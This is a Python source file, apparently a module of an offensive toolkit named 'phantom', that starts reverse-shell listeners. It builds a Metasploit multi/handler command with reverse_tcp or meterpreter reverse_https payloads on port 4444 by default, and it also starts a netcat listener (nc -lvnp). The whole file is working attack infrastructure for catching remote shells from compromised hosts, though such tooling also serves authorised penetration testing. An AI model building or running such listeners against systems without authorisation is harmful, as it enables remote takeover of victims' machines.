"""
handler.py – Reverse shell listener (Metasploit multi/handler, netcat).
"""

from phantom.modules.base_module import BaseModule
from phantom.core.executor import run_command
from rich.console import Console

console = Console()


class HandlerModule(BaseModule):
    module_name = "handler"

    def start_listener(self, port: str = "4444", payload: str = "linux/x64/shell_reverse_tcp"):
        """Start a Metasploit multi/handler for the given payload and port."""
        cmd = (
            f'msfconsole -q -x "'
            f'use exploit/multi/handler; '
            f'set PAYLOAD {payload}; '
            f'set LHOST 0.0.0.0; '
            f'set LPORT {port}; '
            f'set ExitOnSession false; '
            f'run -j"'
        )
        console.print(f"[cyan][*] Starting listener on 0.0.0.0:{port} (payload: {payload})[/]")
        # Run in background: subprocess.Popen would be better, but for simplicity we run synchronous.
        # In real use, we might want to detach. For now, user must open another terminal or use '&'.
        console.print("[yellow]Listener will run in foreground. Press Ctrl+C to stop when done.[/]")
        run_command(cmd)

    def do_listen(self, args):
        """listen --port <port> --type <tcp|https> --payload <payload>"""
        import argparse
        parser = argparse.ArgumentParser()
        parser.add_argument("--port", default="4444")
        parser.add_argument("--type", default="tcp")
        parser.add_argument("--payload", default="linux/x64/shell_reverse_tcp")
        try:
            parsed = parser.parse_args(args.split())
        except SystemExit:
            return

        if parsed.type == "https":
            parsed.payload = "linux/x64/meterpreter/reverse_https"
        self.start_listener(parsed.port, parsed.payload)

    def do_nc(self, port: str):
        """nc <port> — start a simple netcat listener."""
        port = port.strip() or "4444"
        console.print(f"[cyan][*] Starting netcat listener on port {port}[/]")
        run_command(f"nc -lvnp {port}")

    def do_run(self, _):
        port = input("  Port to listen on [4444]: ").strip() or "4444"
        self.start_listener(port)

    def do_preview(self, _):
        self.do_run(_)